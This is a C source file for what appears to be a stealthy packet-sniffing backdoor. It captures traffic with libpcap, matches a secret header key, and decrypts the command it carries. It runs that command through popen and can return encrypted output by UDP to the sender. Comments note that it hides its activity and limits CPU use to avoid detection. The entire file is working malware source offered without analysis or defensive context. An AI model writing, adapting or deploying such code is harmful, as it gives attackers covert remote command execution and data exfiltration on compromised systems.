#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#include "capture.h"
#include "crypto.h"
#include "util.h"
#include "defs.h"

#define ETHER_IP_UDP_LEN 44
#define SRC_OFF 		28 // Source address, so we know where to send results
#define PORT_OFF 		38 // Destination port, we'll reflect results back on the same port

pcap_t* nic;
struct bpf_program fltr_prog;

void pcap_init(const char *fltr_str)
{
	char errbuf[PCAP_ERRBUF_SIZE];

	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
		error(errbuf);
	
	// Get packet fltr_str from arguments
	if (pcap_compile(nic, &fltr_prog, fltr_str, 0, 0) == -1)
		error("pcap_compile");

	// Set fltr_str for captures
	if (pcap_setfilter(nic, &fltr_prog) == -1)
		error("pcap_setfltr_str");
}

void srv_listen(int duplex)
{
	// Start capturing, make sure to heavily restrict our CPU usage.
	while (1)
	{
		if (pcap_dispatch(nic, -1, pkt_handler, (u_char*)duplex) < 0)
			error("pcap_loop");
		usleep(5000);	
	}
}

void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
{
	int len;
	char *ptr, *ptr2;
	char *decryptMsg;
	char *command;
	int duplex = (int) user;
	u_int32_t ip;
	short port;
	int hdr_len, start_len, end_len;

	hdr_len = strlen(HDR_KEY) + 1;
	start_len = strlen(CMD_STR) + 1;
	end_len = strlen(CMD_END) + 1;

	/* Step 1: locate the payload portion of the packet */
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);

	if (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len - start_len - end_len <= 0)
		return;

	/* Step 2: check payload for backdoor header key */
	if (0 != memcmp(ptr, HDR_KEY, hdr_len))
		return;

	ptr += hdr_len;
	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - hdr_len);

	decryptMsg = (char *)calloc(1, MAX_LEN);

	// Step 3: decrypt the packet with DES
	memcpy(decryptMsg, ptr, len);

	decryptMsg = decrypt(PASSKEY, decryptMsg, len);

	//Step 4: verify decrypted contents
	if (!(ptr = strstr(decryptMsg, CMD_STR)))
		return;
	ptr += start_len;

	if (!(ptr2 = strstr(ptr, CMD_END)))
		return;

	// Step 5: extract the remainder
	command = (char*) calloc(1, MAX_LEN);
	strncpy(command, ptr, (ptr2 - ptr));

	free(decryptMsg);

	// Grab the source in case we need to send the result back
	ip = *(u_int32_t*)(packet + SRC_OFF);
	port = *(u_int16_t*)(packet + PORT_OFF);

	// Step 6: Execute the command
	execute(command, ip, port, duplex);
}

void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
{
	FILE *fp;
	char out[MAX_LEN];
	int sock = 0;
	struct sockaddr_in saddr;

	// Run the command, grab stdout
	fp = popen(command, "r");

	// Prep for network comm
	if (duplex)
	{
		bzero(&saddr, sizeof(saddr));
		saddr.sin_family = AF_INET;
		saddr.sin_addr.s_addr = ip;
		saddr.sin_port = port;

		sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (sock < 0)
			perror("socket");
	}

	// Read output line by line
	while (fgets(out, MAX_LEN -1, fp) != NULL)
	{
		if (duplex)
		{
			char *enc = out;
			int len = strlen(out);

			enc = encrypt(PASSKEY, out, len);
			sendto(sock, enc, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));

			free(enc);
		}
		else
			; //Do nothing so we don't give ourselves away.
			//printf("%s", out);
	}

	pclose(fp);
}
